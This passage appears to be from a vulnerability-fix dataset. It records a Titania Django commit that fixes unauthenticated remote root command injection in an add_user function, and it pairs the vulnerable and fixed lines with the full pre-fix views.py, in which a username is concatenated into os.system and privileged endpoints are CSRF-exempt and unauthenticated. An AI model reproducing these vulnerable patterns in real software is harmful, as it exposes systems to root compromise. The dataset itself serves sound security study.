{"https://github.com/Internet-of-People/titania-os": {"9b7805119938343fcac9dc929d8882f1d97cf14a": {"url": "https://api.github.com/repos/Internet-of-People/titania-os/commits/9b7805119938343fcac9dc929d8882f1d97cf14a", "html_url": "https://github.com/Internet-of-People/titania-os/commit/9b7805119938343fcac9dc929d8882f1d97cf14a", "sha": "9b7805119938343fcac9dc929d8882f1d97cf14a", "keyword": "remote code execution change", "diff": "diff --git a/vuedj/configtitania/views.py b/vuedj/configtitania/views.py\nindex aaaad0c..441abfa 100644\n--- a/vuedj/configtitania/views.py\n+++ b/vuedj/configtitania/views.py\n@@ -12,7 +12,7 @@\n from .models import BoxDetails, RegisteredServices\n from .serializers import BoxDetailsSerializer, RegisteredServicesSerializer\n \n-import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd \n+import common, sqlite3, subprocess, NetworkManager, crypt, pwd, getpass, spwd\n \n # fetch network AP details\n nm = NetworkManager.NetworkManager\n@@ -61,7 +61,8 @@ def get_allAPs():\n \n def add_user(username, password):\n     encPass = crypt.crypt(password,\"22\")\n-    os.system(\"useradd -G docker,wheel -p \"+encPass+\" \"+username)\n+    #subprocess escapes the username stopping code injection\n+    subprocess.call(['useradd','-G','docker,wheel','-p',encPass,username])\n \n def add_newWifiConn(wifiname, wifipass):\n     print(wlans)\n", "message": "", "files": {"/vuedj/configtitania/views.py": {"changes": [{"diff": "\n from .models import BoxDetails, RegisteredServices\n from .serializers import BoxDetailsSerializer, RegisteredServicesSerializer\n \n-import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd \n+import common, sqlite3, subprocess, NetworkManager, crypt, pwd, getpass, spwd\n \n # fetch network AP details\n nm = NetworkManager.NetworkManager\n", "add": 1, "remove": 1, "filename": "/vuedj/configtitania/views.py", "badparts": ["import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd "], "goodparts": ["import common, sqlite3, subprocess, NetworkManager, crypt, pwd, getpass, spwd"]}, {"diff": "\n \n def add_user(username, password):\n     encPass = crypt.crypt(password,\"22\")\n-    os.system(\"useradd -G docker,wheel -p \"+encPass+\" \"+username)\n+    #subprocess escapes the username stopping code injection\n+    subprocess.call(['useradd','-G','docker,wheel','-p',encPass,username])\n \n def add_newWifiConn(wifiname, wifipass):\n     print(wlans)\n", "add": 2, "remove": 1, "filename": "/vuedj/configtitania/views.py", "badparts": ["    os.system(\"useradd -G docker,wheel -p \"+encPass+\" \"+username)"], "goodparts": ["    subprocess.call(['useradd','-G','docker,wheel','-p',encPass,username])"]}], "source": "\nfrom django.shortcuts import render from django.http import HttpResponse, JsonResponse from django.views.decorators.csrf import csrf_exempt from rest_framework.renderers import JSONRenderer from rest_framework.parsers import JSONParser from rest_framework.response import Response from rest_framework import viewsets from rest_framework.decorators import list_route from flask import escape from.models import BoxDetails, RegisteredServices from.serializers import BoxDetailsSerializer, RegisteredServicesSerializer import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd nm=NetworkManager.NetworkManager wlans=[d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)] def get_osversion(): \"\"\" PRETTY_NAME of your Titania os(in lowercase). \"\"\" with open(\"/etc/os-release\") as f: osfilecontent=f.read().split(\"\\n\") version=osfilecontent[4].split('=')[1].strip('\\\"') return version def get_allconfiguredwifi(): \"\"\" nmcli con | grep 802-11-wireless \"\"\" ps=subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0] wifirows=ps.split('\\n') wifi=[] for row in wifirows: name=row.split(':') print(name) wifi.append(name[0]) return wifi def get_allAPs(): \"\"\" nmcli con | grep 802-11-wireless \"\"\" ps=subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0] wifirows=ps.split('\\n') wifi=[] for row in wifirows: entry=row.split(':') print(entry) wifi.append(entry) return wifi def add_user(username, password): encPass=crypt.crypt(password,\"22\") os.system(\"useradd -G docker,wheel -p \"+encPass+\" \"+username) def add_newWifiConn(wifiname, wifipass): print(wlans) wlan0=wlans[0] print(wlan0) print(wifiname) for dev in wlans: for ap in dev.AccessPoints: if ap.Ssid==wifiname: currentwifi=ap print(currentwifi) params={ \"802-11-wireless\":{ \"security\": \"802-11-wireless-security\", }, \"802-11-wireless-security\":{ \"key-mgmt\": \"wpa-psk\", \"psk\": wifipass }, } conn=nm.AddAndActivateConnection(params, wlan0, currentwifi) def delete_WifiConn(wifiap): \"\"\" nmcli connection delete id <connection name> \"\"\" ps=subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE) print(ps) def edit_WifiConn(wifiname, wifipass): ps=subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE) print(ps) print(wlans) wlan0=wlans[0] print(wlan0) print(wifiname) for dev in wlans: for ap in dev.AccessPoints: if ap.Ssid==wifiname: currentwifi=ap params={ \"802-11-wireless\":{ \"security\": \"802-11-wireless-security\", }, \"802-11-wireless-security\":{ \"key-mgmt\": \"wpa-psk\", \"psk\": wifipass }, } conn=nm.AddAndActivateConnection(params, wlan0, currentwifi) return @csrf_exempt def handle_config(request): \"\"\" List all code snippets, or create a new snippet. \"\"\" if request.method=='POST': action=request.POST.get(\"_action\") print(action) if action=='registerService': request_name=request.POST.get(\"name\") request_address=request.POST.get(\"address\") request_icon=request.POST.get(\"icon\") print(request_name) print(request_address) print(request_icon) setServiceDetails=RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon) return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False) elif action=='getSchema': schema=get_osversion() return JsonResponse({\"version_info\":schema}, safe=False) elif action=='getIfConfigured': print(action) queryset=BoxDetails.objects.all() serializer=BoxDetailsSerializer(queryset, many=True) return JsonResponse(serializer.data, safe=False) elif action=='loadDependencies': print(action) queryset=RegisteredServices.objects.all() serializer=RegisteredServicesSerializer(queryset, many=True) return JsonResponse(serializer.data, safe=False) elif action=='getAllAPs': wifi_aps=get_allAPs() return JsonResponse(wifi_aps, safe=False) elif action=='saveUserDetails': print(action) boxname=escape(request.POST.get(\"boxname\")) username=escape(request.POST.get(\"username\")) password=escape(request.POST.get(\"password\")) print(username) add_user(username,password) setBoxName=BoxDetails(boxname=boxname) setBoxName.save() wifi_pass=request.POST.get(\"wifi_password\") wifi_name=request.POST.get(\"wifi_ap\") if len(wifi_name) > 0: add_newWifiConn(wifi_name,wifi_pass) return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False) elif action=='login': print(action) username=escape(request.POST.get(\"username\")) password=escape(request.POST.get(\"password\")) output='' \"\"\"Tries to authenticate a user. Returns True if the authentication succeeds, else the reason (string) is returned.\"\"\" try: enc_pwd=spwd.getspnam(username)[1] if enc_pwd in[\"NP\", \"!\", \"\", None]: output=\"User '%s' has no password set\" % username if enc_pwd in[\"LK\", \"*\"]: output=\"account is locked\" if enc_pwd==\"!!\": output=\"password has expired\" if crypt.crypt(password, enc_pwd)==enc_pwd: output='' else: output=\"incorrect password\" except KeyError: output=\"User '%s' not found\" % username if len(output)==0: return JsonResponse({\"username\":username}, safe=False) else: return JsonResponse(output, safe=False) elif action=='logout': print(action) username=request.POST.get(\"username\") print(username+' ') queryset=User.objects.all().first() if username==queryset.username: return JsonResponse({\"STATUS\":\"SUCCESS\", \"username\":queryset.username}, safe=False) elif action=='getDashboardCards': print(action) con=sqlite3.connect(\"dashboard.sqlite3\") cursor=con.cursor() cursor.execute(common.Q_DASHBOARD_CARDS) rows=cursor.fetchall() print(rows) return JsonResponse(rows, safe=False) elif action=='getDashboardChart': print(action) con=sqlite3.connect(\"dashboard.sqlite3\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() print(rows) finalset=[] for row in rows: cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],]) datasets=cursor.fetchall() print(datasets) data={'container_name': row[1], 'data': datasets} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getDockerOverview': print(action) con=sqlite3.connect(\"dashboard.sqlite3\") cursor=con.cursor() cursor.execute(common.Q_GET_DOCKER_OVERVIEW) rows=cursor.fetchall() print(rows) finalset=[] for row in rows: data={'state': row[0], 'container_id': row[1], 'name': row[2], 'image': row[3], 'running_for': row[4], 'command': row[5], 'ports': row[6], 'status': row[7], 'networks': row[8]} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getContainerStats': print(action) con=sqlite3.connect(\"dashboard.sqlite3\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() print(rows) finalset=[] datasets_io=[] datasets_mem=[] datasets_perc=[] for row in rows: datasets_io=[] datasets_mem=[] datasets_perc=[] for iter in range(0,2): cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_perc.append(counter_val) for iter in range(2,4): cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_mem.append(counter_val) for iter in range(4,8): cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_io.append(counter_val) data={'container_id': row[0], 'container_name': row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getThreads': print(action) rows=[] ps=subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0] processes=ps.decode().split('\\n') nfields=len(processes[0].split()) -1 for row in processes[4:]: rows.append(row.split(None, nfields)) return JsonResponse(rows, safe=False) elif action=='getContainerTop': print(action) con=sqlite3.connect(\"dashboard.sqlite3\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() resultset=[] for i in rows: data={} datasets=[] ps=subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0] processes=ps.decode().split('\\n') nfields=len(processes[0].split()) -1 for p in processes[1:]: datasets.append(p.split(None, nfields)) data={'container_id': i[0], 'container_name': i[1], 'data': datasets} resultset.append(data) return JsonResponse(resultset, safe=False) elif action=='getSettings': print(action) ps=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=ps.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False) elif action=='deleteUser': print(action) username=escape(request.POST.get(\"user\")) ps=subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate() fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False) elif action=='addNewUser': print(action) username=escape(request.POST.get(\"username\")) password=escape(request.POST.get(\"password\")) add_user(username,password) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False) elif action=='addWifi': print(action) wifi_pass=escape(request.POST.get(\"wifi_password\")) wifi_name=request.POST.get(\"wifi_ap\") if len(wifi_name) > 0: add_newWifiConn(wifi_name,wifi_pass) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False) elif action=='deleteWifi': print(action) wifi_name=request.POST.get(\"wifi\") delete_WifiConn(wifi_name) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False) elif action=='editWifi': print(action) wifi_name=request.POST.get(\"wifi_ap\") wifi_pass=escape(request.POST.get(\"wifi_password\")) edit_WifiConn(wifi_name,wifi_pass) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False) return JsonResponse(serializer.errors, status=400) def index(request): return render(request, 'index.html') class BoxDetailsViewSet(viewsets.ModelViewSet): queryset=BoxDetails.objects.all() serializer_class=BoxDetailsSerializer class RegisteredServicesViewSet(viewsets.ModelViewSet): queryset=RegisteredServices.objects.all() serializer_class=RegisteredServicesSerializer ", "sourceWithComments": "from django.shortcuts import render\nfrom django.http import HttpResponse, JsonResponse\nfrom django.views.decorators.csrf import csrf_exempt\n\nfrom rest_framework.renderers import JSONRenderer\nfrom rest_framework.parsers import JSONParser\nfrom rest_framework.response import Response\nfrom rest_framework import viewsets\nfrom rest_framework.decorators import list_route\nfrom flask import escape\n\nfrom .models import BoxDetails, RegisteredServices\nfrom .serializers import BoxDetailsSerializer, RegisteredServicesSerializer\n\nimport common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd \n\n# fetch network AP details\nnm = NetworkManager.NetworkManager\nwlans = [d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)]\n\ndef get_osversion():\n    \"\"\"\n    PRETTY_NAME of your Titania os (in lowercase).\n    \"\"\"\n    with open(\"/etc/os-release\") as f:\n        osfilecontent = f.read().split(\"\\n\")\n        # $PRETTY_NAME is at the 5th position\n        version = osfilecontent[4].split('=')[1].strip('\\\"')\n        return version\n\ndef get_allconfiguredwifi():\n    \"\"\"\n    nmcli con | grep 802-11-wireless\n    \"\"\"\n    ps = subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0]\n    wifirows = ps.split('\\n')\n    wifi = []\n    for row in wifirows:\n        name = row.split(':')\n        print(name)\n        wifi.append(name[0])\n    return wifi\n\ndef get_allAPs():\n    \"\"\"\n    nmcli con | grep 802-11-wireless\n    \"\"\"\n    ps = subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0]\n    wifirows = ps.split('\\n')\n    wifi = []\n    for row in wifirows:\n        entry = row.split(':')\n        print(entry)\n        wifi.append(entry)\n    return wifi\n    # wifi_aps = []   \n    # for dev in wlans:\n    #     for ap in dev.AccessPoints:\n    #         wifi_aps.append(ap.Ssid)\n    # return wifi_aps\n\ndef add_user(username, password):\n    encPass = crypt.crypt(password,\"22\")\n    os.system(\"useradd -G docker,wheel -p \"+encPass+\" \"+username)\n\ndef add_newWifiConn(wifiname, wifipass):\n    print(wlans)\n    wlan0 = wlans[0]\n    print(wlan0)\n    print(wifiname)\n    # get selected ap as currentwifi\n    for dev in wlans:\n        for ap in dev.AccessPoints:\n            if ap.Ssid == wifiname:\n                currentwifi = ap\n    print(currentwifi)\n    # params to set password\n    params = {\n            \"802-11-wireless\": {\n                \"security\": \"802-11-wireless-security\",\n            },\n            \"802-11-wireless-security\": {\n                \"key-mgmt\": \"wpa-psk\",\n                \"psk\": wifipass\n            },\n        }\n    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi)        \n\ndef delete_WifiConn(wifiap):\n    \"\"\"\n    nmcli connection delete id <connection name>\n    \"\"\"\n    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE)\n    print(ps)\n\ndef edit_WifiConn(wifiname, wifipass):\n    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE)\n    print(ps)\n    print(wlans)\n    wlan0 = wlans[0]\n    print(wlan0)\n    print(wifiname)\n    # get selected ap as currentwifi\n    for dev in wlans:\n        for ap in dev.AccessPoints:\n            if ap.Ssid == wifiname:\n                currentwifi = ap\n    # params to set password\n    params = {\n            \"802-11-wireless\": {\n                \"security\": \"802-11-wireless-security\",\n            },\n            \"802-11-wireless-security\": {\n                \"key-mgmt\": \"wpa-psk\",\n                \"psk\": wifipass\n            },\n        }\n    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi) \n    return       \n\n@csrf_exempt\ndef handle_config(request):\n    \"\"\"\n    List all code snippets, or create a new snippet.\n    \"\"\" \n    if request.method == 'POST':\n        action = request.POST.get(\"_action\")\n        print(action)\n        if action == 'registerService':\n            request_name = request.POST.get(\"name\")\n            request_address = request.POST.get(\"address\")\n            request_icon = request.POST.get(\"icon\")\n            print(request_name)\n            print(request_address)\n            print(request_icon)\n            setServiceDetails = RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon)\n            return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False)\n        elif action == 'getSchema':\n            schema = get_osversion()\n            return JsonResponse({\"version_info\":schema}, safe=False)\n        elif action == 'getIfConfigured':\n            print(action)\n            queryset = BoxDetails.objects.all()\n            serializer = BoxDetailsSerializer(queryset, many=True)\n            return JsonResponse(serializer.data, safe=False)\n        elif action == 'loadDependencies':\n            print(action)\n            queryset = RegisteredServices.objects.all()\n            serializer = RegisteredServicesSerializer(queryset, many=True)\n            return JsonResponse(serializer.data, safe=False)\n        elif action == 'getAllAPs':\n            wifi_aps = get_allAPs()\n            return JsonResponse(wifi_aps, safe=False)\n        elif action == 'saveUserDetails':\n            print(action)\n            boxname = escape(request.POST.get(\"boxname\"))\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            print(username)\n            add_user(username,password)\n            setBoxName = BoxDetails(boxname=boxname)\n            setBoxName.save()\n            # connect to wifi ap user selected\n            wifi_pass = request.POST.get(\"wifi_password\")\n            wifi_name = request.POST.get(\"wifi_ap\")\n            if len(wifi_name) > 0:\n                add_newWifiConn(wifi_name,wifi_pass)\n            return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False)\n        elif action == 'login':\n            print(action)\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            output=''\n            \"\"\"Tries to authenticate a user.\n            Returns True if the authentication succeeds, else the reason\n            (string) is returned.\"\"\"\n            try:\n                enc_pwd = spwd.getspnam(username)[1]\n                if enc_pwd in [\"NP\", \"!\", \"\", None]:\n                    output = \"User '%s' has no password set\" % username\n                if enc_pwd in [\"LK\", \"*\"]:\n                    output = \"account is locked\"\n                if enc_pwd == \"!!\":\n                    output = \"password has expired\"\n                # Encryption happens here, the hash is stripped from the\n                # enc_pwd and the algorithm id and salt are used to encrypt\n                # the password.\n                if crypt.crypt(password, enc_pwd) == enc_pwd:\n                    output = ''\n                else:\n                    output = \"incorrect password\"\n            except KeyError:\n                output = \"User '%s' not found\" % username\n            if len(output) == 0:\n                return JsonResponse({\"username\":username}, safe=False)\n            else:\n                return JsonResponse(output, safe=False)\n        elif action == 'logout':\n            print(action)\n            username = request.POST.get(\"username\")\n            print(username+' ')\n            queryset = User.objects.all().first()\n            if username == queryset.username:\n                return JsonResponse({\"STATUS\":\"SUCCESS\", \"username\":queryset.username}, safe=False)\n        elif action == 'getDashboardCards':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_DASHBOARD_CARDS)\n            rows = cursor.fetchall()\n            print(rows)\n            return JsonResponse(rows, safe=False)\n        elif action == 'getDashboardChart':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            for row in rows:\n                cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],])\n                datasets = cursor.fetchall()\n                print(datasets)\n                data = {'container_name' : row[1], 'data': datasets}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getDockerOverview':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_DOCKER_OVERVIEW)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            for row in rows:\n                data = {'state': row[0], 'container_id': row[1], 'name': row[2],\n                        'image': row[3], 'running_for': row[4],\n                        'command': row[5], 'ports': row[6],\n                        'status': row[7], 'networks': row[8]}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getContainerStats':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            datasets_io = []\n            datasets_mem = []\n            datasets_perc = []\n            for row in rows:\n                datasets_io = []\n                datasets_mem = []\n                datasets_perc = []\n                # values with % appended to them\n                for iter in range(0,2):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_perc.append(counter_val)\n                # values w/o % appended to them\n                for iter in range(2,4):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_mem.append(counter_val)\n                # values w/o % appended to them\n                for iter in range(4,8):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_io.append(counter_val)\n                data = {'container_id': row[0], 'container_name' : row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getThreads':\n            print(action)\n            rows = []\n            ps = subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0]\n            processes = ps.decode().split('\\n')\n            # this specifies the number of splits, so the splitted lines\n            # will have (nfields+1) elements\n            nfields = len(processes[0].split()) - 1\n            for row in processes[4:]:\n                rows.append(row.split(None, nfields))\n            return JsonResponse(rows, safe=False)\n        elif action == 'getContainerTop':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            resultset = []\n            for i in rows:\n                data = {}\n                datasets = []\n                ps = subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0]\n                processes = ps.decode().split('\\n')\n                # this specifies the number of splits, so the splitted lines\n                # will have (nfields+1) elements\n                nfields = len(processes[0].split()) - 1\n                for p in processes[1:]:\n                    datasets.append(p.split(None, nfields))\n                data = {'container_id': i[0], 'container_name' : i[1], 'data': datasets}\n                resultset.append(data)\n            return JsonResponse(resultset, safe=False)\n        elif action == 'getSettings':\n            print(action)\n            ps = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = ps.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False)\n        elif action == 'deleteUser':\n            print(action)\n            username = escape(request.POST.get(\"user\"))\n            ps = subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate()\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False)\n        elif action == 'addNewUser':\n            print(action)\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            add_user(username,password)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False)\n        elif action == 'addWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_pass = escape(request.POST.get(\"wifi_password\"))\n            wifi_name = request.POST.get(\"wifi_ap\")\n            if len(wifi_name) > 0:\n                add_newWifiConn(wifi_name,wifi_pass)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False)\n        elif action == 'deleteWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_name = request.POST.get(\"wifi\")\n            delete_WifiConn(wifi_name)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False)\n        elif action == 'editWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_name = request.POST.get(\"wifi_ap\")\n            wifi_pass = escape(request.POST.get(\"wifi_password\"))\n            edit_WifiConn(wifi_name,wifi_pass)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False)\n        return JsonResponse(serializer.errors, status=400)\n\ndef index(request):\n    return render(request, 'index.html')\n\nclass BoxDetailsViewSet(viewsets.ModelViewSet):\n    queryset = BoxDetails.objects.all()\n    serializer_class = BoxDetailsSerializer\n\nclass RegisteredServicesViewSet(viewsets.ModelViewSet):\n    queryset = RegisteredServices.objects.all()\n    serializer_class = RegisteredServicesSerializer    \n\n\n"}}, "msg": "#21 Unauthenticated remote root code execution\n\nChanged from os.system to subprocess that escapes username automatically"}}, "https://github.com/Internet-of-People/titania-ux": {"9b7805119938343fcac9dc929d8882f1d97cf14a": {"url": "https://api.github.com/repos/Internet-of-People/titania-ux/commits/9b7805119938343fcac9dc929d8882f1d97cf14a", "html_url": "https://github.com/Internet-of-People/titania-ux/commit/9b7805119938343fcac9dc929d8882f1d97cf14a", "sha": "9b7805119938343fcac9dc929d8882f1d97cf14a", "keyword": "remote code execution change", "diff": "diff --git a/vuedj/configtitania/views.py b/vuedj/configtitania/views.py\nindex aaaad0c..441abfa 100644\n--- a/vuedj/configtitania/views.py\n+++ b/vuedj/configtitania/views.py\n@@ -12,7 +12,7 @@\n from .models import BoxDetails, RegisteredServices\n from .serializers import BoxDetailsSerializer, RegisteredServicesSerializer\n \n-import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd \n+import common, sqlite3, subprocess, NetworkManager, crypt, pwd, getpass, spwd\n \n # fetch network AP details\n nm = NetworkManager.NetworkManager\n@@ -61,7 +61,8 @@ def get_allAPs():\n \n def add_user(username, password):\n     encPass = crypt.crypt(password,\"22\")\n-    os.system(\"useradd -G docker,wheel -p \"+encPass+\" \"+username)\n+    #subprocess escapes the username stopping code injection\n+    subprocess.call(['useradd','-G','docker,wheel','-p',encPass,username])\n \n def add_newWifiConn(wifiname, wifipass):\n     print(wlans)\n", "message": "", "files": {"/vuedj/configtitania/views.py": {"changes": [{"diff": "\n from .models import BoxDetails, 